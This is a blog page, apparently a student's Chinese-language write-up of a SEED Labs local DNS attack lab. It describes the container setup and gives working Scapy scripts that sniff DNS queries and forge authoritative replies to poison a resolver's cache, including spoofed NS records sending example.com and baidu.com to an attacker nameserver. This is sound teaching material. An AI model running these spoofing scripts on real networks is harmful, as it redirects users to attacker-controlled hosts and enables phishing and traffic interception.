@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Lab OverviewDNS 域名系统是互联网的电话簿，负责主机名和 IP 地址的互相转化。这种转化是通过 DNS 解析在幕后进行的。DNS 攻击以各种方式操纵解析过程，将用户误导到恶意目的地。本实验专注于本地攻击，包括以下主题：  DNS 以及它是如何工作的 DNS 服务器设置 DNS 缓存污染攻击 欺骗 DNS 响应  Lab Environment Setup Task本次实现的环境设置如">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DNS-Local DNS Attack Lab">
+<meta property="og:url" content="https://ceyewan.github.io/p/3c846f5.html">
+<meta property="og:site_name" content="Ceyewan&#39;s Blog">
+<meta property="og:description" content="Lab OverviewDNS 域名系统是互联网的电话簿，负责主机名和 IP 地址的互相转化。这种转化是通过 DNS 解析在幕后进行的。DNS 攻击以各种方式操纵解析过程，将用户误导到恶意目的地。本实验专注于本地攻击，包括以下主题：  DNS 以及它是如何工作的 DNS 服务器设置 DNS 缓存污染攻击 欺骗 DNS 响应  Lab Environment Setup Task本次实现的环境设置如">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312214625126.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232324059.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232656499.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232823668.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232905034.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313001650397.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313001125261.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313003731276.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313005231690.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240314113753641.png">
+<meta property="article:published_time" content="2024-03-17T16:45:55.000Z">
+<meta property="article:modified_time" content="2024-03-27T07:31:36.723Z">
+<meta property="article:author" content="ceyewan">
+<meta property="article:tag" content="DNS Attack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312214625126.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icons.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-apple-touch.png">
+        
+      
+    
+    <!-- title -->
+    <title>DNS-Local DNS Attack Lab</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/p/4b85c8d5.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/p/e19655e2.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/3c846f5.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/3c846f5.html&text=DNS-Local DNS Attack Lab"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/3c846f5.html&title=DNS-Local DNS Attack Lab"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/3c846f5.html&is_video=false&description=DNS-Local DNS Attack Lab"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DNS-Local DNS Attack Lab&body=Check out this article: https://ceyewan.github.io/p/3c846f5.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/3c846f5.html&title=DNS-Local DNS Attack Lab"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/3c846f5.html&title=DNS-Local DNS Attack Lab"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/3c846f5.html&title=DNS-Local DNS Attack Lab"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/3c846f5.html&title=DNS-Local DNS Attack Lab"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/3c846f5.html&name=DNS-Local DNS Attack Lab&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/3c846f5.html&t=DNS-Local DNS Attack Lab"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Overview"><span class="toc-number">1.</span> <span class="toc-text">Lab Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Environment-Setup-Task"><span class="toc-number">2.</span> <span class="toc-text">Lab Environment Setup Task</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Testing-the-DNS-Setup"><span class="toc-number">2.1.</span> <span class="toc-text">Testing the DNS Setup</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Attack-Tasks"><span class="toc-number">3.</span> <span class="toc-text">The Attack Tasks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-1-Directly-Spoofing-Response-to-User"><span class="toc-number">3.1.</span> <span class="toc-text">Task 1: Directly Spoofing Response to User</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-2-DNS-Cache-Poisoning-Attack-%E2%80%93-Spoofing-Answers"><span class="toc-number">3.2.</span> <span class="toc-text">Task 2: DNS Cache Poisoning Attack – Spoofing Answers</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-3-Spoofing-NS-Records"><span class="toc-number">3.3.</span> <span class="toc-text">Task 3: Spoofing NS Records</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-4-Spoofing-NS-Records-for-Another-Domain"><span class="toc-number">3.4.</span> <span class="toc-text">Task 4: Spoofing NS Records for Another Domain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-5-Spoofing-Records-in-the-Additional-Section"><span class="toc-number">3.5.</span> <span class="toc-text">Task 5: Spoofing Records in the Additional Section</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        DNS-Local DNS Attack Lab
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ceyewan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-17T16:45:55.000Z" class="dt-published" itemprop="datePublished">2024-03-18</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/SeedLabs-NetworkSecurity/">SeedLabs/NetworkSecurity</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/DNS-Attack/" rel="tag">DNS Attack</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="Lab-Overview"><a href="#Lab-Overview" class="headerlink" title="Lab Overview"></a>Lab Overview</h3><p>DNS 域名系统是互联网的电话簿，负责主机名和 IP 地址的互相转化。这种转化是通过 DNS 解析在幕后进行的。DNS 攻击以各种方式操纵解析过程，将用户误导到恶意目的地。本实验专注于本地攻击，包括以下主题：</p>
+<ul>
+<li>DNS 以及它是如何工作的</li>
+<li>DNS 服务器设置</li>
+<li>DNS 缓存污染攻击</li>
+<li>欺骗 DNS 响应</li>
+</ul>
+<h3 id="Lab-Environment-Setup-Task"><a href="#Lab-Environment-Setup-Task" class="headerlink" title="Lab Environment Setup Task"></a>Lab Environment Setup Task</h3><p>本次实现的环境设置如下，具有一个 DNS 服务器，一个 User 和一个 Attacker 以及一个 ns-Attacker。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312214625126.png" alt="image-20240312214625126"></p>
+<p><strong>攻击者容器</strong>：配置共享文件夹、网络模式为主机模式，可以嗅探所有容器中的数据包。</p>
+<p><strong>本地 DNS 服务器</strong>：运行 BIND 9 程序，这是一个 DNS 服务器程序。BIND 9 从 &#x2F;etc&#x2F;bind&#x2F;named.conf 中获取配置，这个文件是主配置文件，通常包括许多 include 条目，其中一个文件叫做 &#x2F;etc&#x2F;bind&#x2F;named.conf.options，实际的配置信息被存储在这些包含的文件中。</p>
+<ul>
+<li><strong>简化</strong>：DNS 服务器在查询中使用随机化的源端口号，尽管这可以预测，为了简化实验，我们在配置文件中将源端口号固定位 33333。</li>
+<li><strong>关闭 DNSSEC</strong>：引入 DNSSEC 是为了防止 DNS 服务器上的欺骗攻击，我们关闭它以展示没有这种保护措施的攻击是如何工作的。</li>
+<li><strong>DNS 缓存</strong>：在攻击中，我们需要污染本地 DNS 服务器上的 DNS 缓存。其中 <code>rndc dumpdb -cache</code> 将缓存存储到文件 &#x2F;var&#x2F;cache&#x2F;bind&#x2F;dump.db，<code>rndc flush</code> 用于清空缓存。</li>
+<li><strong>attacker32.com 转发区</strong>：转发区是一种在 DNS 服务器上配置的机制，用于将特定域名的查询转发到指定的名称服务器（nameserver），该名称服务器托管在攻击者容器中。</li>
+</ul>
+<p><strong>用户：</strong>用户容器已经配置使用 10.9.0.53 作为本地 DNS 服务器。这是通过修改配置文件 &#x2F;etc&#x2F;resolv.conf 来实现的。</p>
+<p><strong>攻击者的 NameServer</strong>：在攻击者的名称服务器，我们有两个区域 zone。一个是合法的 attacker32.com，一个是虚假的 example.com。这些区域在 &#x2F;etc&#x2F;bind&#x2F;named.conf 中配置。</p>
+<h4 id="Testing-the-DNS-Setup"><a href="#Testing-the-DNS-Setup" class="headerlink" title="Testing the DNS Setup"></a>Testing the DNS Setup</h4><p><strong>获取 ns.attacker32.com 的 IP 地址。</strong>我们运行 <code>dig ns.attacker32.com</code> 由于 DNS 服务器添加了转发区域条目，因此结果来自 ns-Attacker 上设置的区域文件。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232324059.png" alt="image-20240312232324059"></p>
+<p><strong>获取 <a target="_blank" rel="noopener" href="http://www.example/">www.example</a>. com 的 IP 地址。</strong>两个命名服务器现在承载着 example.com 域名，一个是域名的官方命名服务器，另一个是攻击者容器。我们将查询这两个名称服务器，看看会得到什么样的响应。</p>
+<p>我们发现使用 DNS 服务器得到的结果如下，这就是正确的 IP 地址。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232656499.png" alt="image-20240312232656499"></p>
+<p>使用在线 DNS 解析工具验证，可以发现这个结果来自互联网。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232823668.png" alt="image-20240312232823668"></p>
+<p>如果我们指定使用 ns-Attacker 来查询，那么结果就来自 ns-Attacker 的配置文件。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232905034.png" alt="image-20240312232905034"></p>
+<p>域名服务器缓存污染攻击的目的是让受害者向 ns.attacker32.com 询问 <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> 的 IP 地址。也就是说，只运行第一个 dig 命令，那个没有 @ 选项的命令，就可以从 ns-Attacker 那里得到假的结果。</p>
+<h3 id="The-Attack-Tasks"><a href="#The-Attack-Tasks" class="headerlink" title="The Attack Tasks"></a>The Attack Tasks</h3><h4 id="Task-1-Directly-Spoofing-Response-to-User"><a href="#Task-1-Directly-Spoofing-Response-to-User" class="headerlink" title="Task 1: Directly Spoofing Response to User"></a>Task 1: Directly Spoofing Response to User</h4><p>当用户在浏览器中键入网站名称如 <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> 时，用户的计算机将向本地 DNS 服务器发送 DNS 请求，以解析主机名称的 IP 地址。攻击者可以嗅到 DNS 请求消息，然后 他们可以立即创建一个假的 DNS 响应，并发送回用户机器。如果假回复比真回复早到达，它将被用户机接受。如果本地 DNS 服务器没有缓存，那么会向根 DNS 服务器请求，同样我们也可以创建一个假的 DNS 响应。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313001650397.png" alt="image-20240313001650397"></p>
+<p>构造的代码如下，其中：</p>
+<ul>
+<li>id：标识一整个 DNS 会话，响应包需要的请求包相同。</li>
+<li>qd：query domain，请求的域名，需要和请求包相同。</li>
+<li>aa：Authoritative answer，1 表示包含权威答案。</li>
+<li>rd：Recursive Desired，0 表示禁止递归查询。</li>
+<li>qr： Query Response，表示是一个响应包。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">NS_NAME = <span class="string">&quot;example.com&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> NS_NAME <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))</span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)  <span class="comment"># Create an IP object</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)  <span class="comment"># Create a UDP object</span></span><br><span class="line">        <span class="comment"># Create an aswer record</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname,</span><br><span class="line">                       <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.5&#x27;</span>)</span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, an=Anssec)  <span class="comment"># Create a DNS object</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt  <span class="comment"># Assemble the spoofed DNS packet</span></span><br><span class="line">        send(spoofpkt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&quot;udp and dst port 53&quot;</span>  <span class="comment"># Set the filter</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-563e32bc5643&#x27;</span>, <span class="built_in">filter</span>=myFilter, prn=spoof_dns)</span><br></pre></td></tr></table></figure>
+
+<p>执行结果如下，首先，清空本地 DNS 服务器的缓存。然后执行上述代码，在 User 容器执行 dig <a target="_blank" rel="noopener" href="http://www.example.com,发现欺骗成功.可以看到,我们的程序构造了两个响应包,一个发送给了用户,一个发送给了本地的/">www.example.com，发现欺骗成功。可以看到，我们的程序构造了两个响应包，一个发送给了用户，一个发送给了本地的</a> DNS 服务器。（图里有四个是因为我执行了两次）</p>
+<p>在缓存中，我们发现 DNS 中出现了 <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> 的缓存，用户查询的结果是一个假的地址，攻击成功。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313001125261.png" alt="image-20240313001125261"></p>
+<h4 id="Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers"><a href="#Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers" class="headerlink" title="Task 2: DNS Cache Poisoning Attack – Spoofing Answers"></a>Task 2: DNS Cache Poisoning Attack – Spoofing Answers</h4><p>已经实现了，就是不仅要欺骗用户，也要欺骗 DNS 服务器。</p>
+<h4 id="Task-3-Spoofing-NS-Records"><a href="#Task-3-Spoofing-NS-Records" class="headerlink" title="Task 3: Spoofing NS Records"></a>Task 3: Spoofing NS Records</h4><p>上面我们只影响了一个主机名，接下来我们发起对整个 example.com 域名的攻击。在 DNS 答复中使用 Authority 部分。基本上，当我们欺骗一个回复，除了欺骗答案，我们添加以下权威部分。当这个条目被本地 DNS 服务器缓存时，ns.attacker32.com 将被用作命名服务器，以便将来查询 example.com 域中的任何主机名。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">example.com. 259200 IN NS ns.attacker32.com.</span><br></pre></td></tr></table></figure>
+
+<p>我们修改代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Anssec = DNSRR(rrname=pkt[DNS].qd.qname,</span><br><span class="line">               <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.5&#x27;</span>)</span><br><span class="line"><span class="comment"># The Authority Section</span></span><br><span class="line">NSsec = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">              ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">             qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">1</span>, an=Anssec, ns=NSsec)  <span class="comment"># Create a DNS object</span></span><br></pre></td></tr></table></figure>
+
+<p>执行结果如下：</p>
+<p>第一次执行捕获三个请求包，分别是 User 请求 Local DNS 服务器，Local DNS 服务器请求 Remote DNS 服务器，Local DNS 服务器请求 ns-Attacker 服务器。攻击也成功了，出现了我们构造的 NS 条目。后续请求 mail.example.com 时，直接请求的就是 ns-Attacker 服务器。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313003731276.png" alt="image-20240313003731276"></p>
+<h4 id="Task-4-Spoofing-NS-Records-for-Another-Domain"><a href="#Task-4-Spoofing-NS-Records-for-Another-Domain" class="headerlink" title="Task 4: Spoofing NS Records for Another Domain"></a>Task 4: Spoofing NS Records for Another Domain</h4><p>在上面，我们已经攻击了 example.com 的 DNS 缓存，接下来，我们拓展到其他的域名。因此，我们在 DNS 响应中，添加一个权威部分条目，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># The Authority Section</span></span><br><span class="line">NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">               ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">NSsec2 = DNSRR(rrname=<span class="string">&#x27;baidu.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">               ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">             qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">2</span>, an=Anssec, ns=NSsec1/NSsec2)  <span class="comment"># Create a DNS object</span></span><br></pre></td></tr></table></figure>
+
+<p>执行结果如下，对用户攻击成功了，但是对 DNS 服务器攻击失败了。因为 DNS 服务器会去访问我们的 ns-Attacker 服务器，没有设置 baidu.com 的条目，因此就不会写入缓存。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313005231690.png" alt="image-20240313005231690"></p>
+<h4 id="Task-5-Spoofing-Records-in-the-Additional-Section"><a href="#Task-5-Spoofing-Records-in-the-Additional-Section" class="headerlink" title="Task 5: Spoofing Records in the Additional Section"></a>Task 5: Spoofing Records in the Additional Section</h4><p>在 DNS 回复中，有一个叫做 Additional Section 的部分，用来提供额外的信息。实际上，它主要用于提供一些主机名的 IP 地址，特别是那些出现在 Authority 部分的主机名。这个任务的目的是欺骗本节中的一些条目，看看它们是否会被目标本地 DNS 服务器成功缓存。结果就是并没有缓存。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240314113753641.png" alt="image-20240314113753641"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Overview"><span class="toc-number">1.</span> <span class="toc-text">Lab Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Environment-Setup-Task"><span class="toc-number">2.</span> <span class="toc-text">Lab Environment Setup Task</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Testing-the-DNS-Setup"><span class="toc-number">2.1.</span> <span class="toc-text">Testing the DNS Setup</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Attack-Tasks"><span class="toc-number">3.</span> <span class="toc-text">The Attack Tasks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-1-Directly-Spoofing-Response-to-User"><span class="toc-number">3.1.</span> <span class="toc-text">Task 1: Directly Spoofing Response to User</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-2-DNS-Cache-Poisoning-Attack-%E2%80%93-Spoofing-Answers"><span class="toc-number">3.2.</span> <span class="toc-text">Task 2: DNS Cache Poisoning Attack – Spoofing Answers</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-3-Spoofing-NS-Records"><span class="toc-number">3.3.</span> <span class="toc-text">Task 3: Spoofing NS Records</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-4-Spoofing-NS-Records-for-Another-Domain"><span class="toc-number">3.4.</span> <span class="toc-text">Task 4: Spoofing NS Records for Another Domain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-5-Spoofing-Records-in-the-Additional-Section"><span class="toc-number">3.5.</span> <span class="toc-text">Task 5: Spoofing Records in the Additional Section</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/3c846f5.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/3c846f5.html&text=DNS-Local DNS Attack Lab"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/3c846f5.html&title=DNS-Local DNS Attack Lab"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/3c846f5.html&is_video=false&description=DNS-Local DNS Attack Lab"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DNS-Local DNS Attack Lab&body=Check out this article: https://ceyewan.github.io/p/3c846f5.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/3c846f5.html&title=DNS-Local DNS Attack Lab"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/3c846f5.html&title=DNS-Local DNS Attack Lab"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/3c846f5.html&title=DNS-Local DNS Attack Lab"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/3c846f5.html&title=DNS-Local DNS Attack Lab"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/3c846f5.html&name=DNS-Local DNS Attack Lab&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
